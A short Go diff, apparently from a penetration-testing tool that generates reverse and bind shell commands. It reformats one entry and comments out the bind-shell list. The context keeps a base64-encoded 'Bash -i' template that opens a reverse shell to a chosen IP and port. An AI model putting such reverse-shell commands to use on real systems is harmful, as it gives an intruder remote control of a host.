@@ -47,7 +47,7 @@ var Listeners = []Listener{
 
 // TODO: Complete the list
 var ReverseShellCommands = []ReverseShellCommand{
-{
+	{
 		"Bash -i",
 		"e3suU2hlbGx9fSAtaSA+JiAvZGV2L3RjcC97ey5JcH19L3t7LlBvcnR9fSAwPiYx",
 		[]string{"linux", "mac"},
@@ -409,6 +409,8 @@ var ReverseShellCommands = []ReverseShellCommand{
 	},
 }
 
+// TODO: Base64 format these too similar to ReverseShell.
+/* Commenting this for now.
 var BindShellCommands = []BindShellCommand{
 	{
 		"Python3 Bind",
@@ -431,3 +433,4 @@ var BindShellCommands = []BindShellCommand{
 		[]string{"bind", "mac", "linux"},
 	},
 }
+*/
